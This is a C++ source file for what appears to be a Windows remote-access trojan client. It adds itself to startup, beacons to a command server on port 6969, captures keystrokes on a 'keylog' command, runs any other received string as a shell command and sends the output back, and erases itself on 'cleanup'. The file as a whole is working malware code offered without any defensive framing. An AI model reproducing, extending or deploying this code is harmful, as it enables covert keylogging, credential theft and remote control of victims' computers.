#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <windows.h>
#include <chrono>
#include <codecvt>
#include "modules.h"

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 2048

bool connectToServer(SOCKET& ConnectSocket, struct addrinfo* result, struct addrinfo* ptr, char* recvbuf, int& recvbuflen);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AddToStartup();
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char sendbuf[DEFAULT_BUFLEN];
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        std::cout << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", "6969", &hints, &result);
    if (iResult != 0) {
        std::cout << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    // Main loop to keep trying to connect and communicate
    while(true) {
        if(connectToServer(ConnectSocket, result, ptr, recvbuf, recvbuflen)) {
            // Logic for communication with the server goes here
            // You can use a similar loop as before for receiving and sending data
            // Make sure to include logic to detect disconnection and break out of the loop
            while(true){
                iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                if (iResult > 0) {
                    std::cout << "Bytes received: " << iResult << std::endl;
                    std::cout << "Message: " << recvbuf << std::endl;

                    // Based on the command received, send information back
                    // For example, if the server sends "hello", respond with "world"
                    if (std::string(recvbuf, iResult) == "hello") {
                        strcpy_s(sendbuf, "world");
                        send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
                    }
                    else if (std::string(recvbuf, iResult) == "keylog") {
                        std::wstring wstr = LogKeysForDuration();
                        int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
                        std::string strTo(sizeNeeded, 0);
                        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], sizeNeeded, NULL, NULL);

                        strcpy_s(sendbuf, strTo.c_str());
                        send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
                    }
                    else if (std::string(recvbuf, iResult) == "cleanup") {
                        freeaddrinfo(result);
                        WSACleanup();
                        closesocket(ConnectSocket);
                        cleanup();
                        return 0;
                    } else 
                    {
                        std::string output = execCommand(std::string(recvbuf, iResult).c_str());
                        strcpy_s(sendbuf, output.c_str());
                        send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
                    }
                }
                else if (iResult == 0)
                {
                    std::cout << "Connection closed" << std::endl;
                    break;
                }
                else
                {
                    std::cout << "recv failed: " << WSAGetLastError() << std::endl;
                    break;
                }     
            }
        }
        Sleep(5000);
    }
}

bool connectToServer(SOCKET& ConnectSocket, struct addrinfo* result, struct addrinfo* ptr, char* recvbuf, int& recvbuflen) {
    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
            continue;
        }

        // Connect to server.
        int iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        return true; // Successfully connected
    }
    return false; // Failed to connect
}
